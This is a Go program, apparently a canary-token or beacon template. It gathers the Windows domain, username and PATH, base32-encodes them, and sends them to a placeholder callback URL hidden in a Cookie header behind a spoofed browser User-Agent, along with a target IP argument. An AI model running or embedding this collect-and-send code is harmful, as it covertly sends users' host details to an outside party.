package main

import (
	"encoding/base32"
	"fmt"
	"log"
	"net/http"
	"os"
	"strings"
)

func main() {

	client := &http.Client{}
	CallBack := "$canary_url"

	var envDomain string = os.Getenv("USERDOMAIN")
	var envUsername string = os.Getenv("USERNAME")
	var envPath string = os.Getenv("PATH")
	TGTIP := os.Args[2]
	TGT := string(TGTIP)
	TargetIPPre := strings.Replace(TGT, "\r", "", -1)
	TargetIP := strings.Replace(TargetIPPre, "\r", "", -1)

	data := []byte(string("Domain\n: " + envDomain + "Username\n: " + envUsername + "\n" + envPath))
	str := base32.StdEncoding.EncodeToString(data)

	req, err := http.NewRequest("GET", CallBack, nil)
	if err != nil {
		log.Fatalln(err)
	}

	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36")
	req.Header.Set("Cookie", str)
	req.Header.Set("X-Target-IP", TargetIP)

	resp, err := client.Do(req)

	if err != nil {
		log.Fatalln(err)
		fmt.Println(resp)
	}

}
